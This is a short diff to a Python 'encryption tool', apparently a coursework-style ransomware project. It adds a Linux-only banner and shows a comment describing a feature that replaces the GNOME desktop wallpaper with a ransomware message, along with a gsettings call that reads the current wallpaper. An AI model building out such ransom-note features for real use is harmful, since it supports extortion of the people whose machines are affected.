@@ -11,8 +11,9 @@ import time
 # Reference: ChatGPT
 # Reference: https://software.codidact.com/posts/287782/287783
 # ------------------------------- 
-
-
+#################################################################
+###### THIS CODE SHOULD BE RAN IN A LINUX ENVIRONMENT ###########
+#################################################################
 # Add a feature capability to your Python encryption tool to:
 # Alter the desktop wallpaper on a Linux PC with a ransomware message
 result = subprocess.run(['gsettings', 'get', 'org.gnome.desktop.background', 'picture-uri'], capture_output=True)
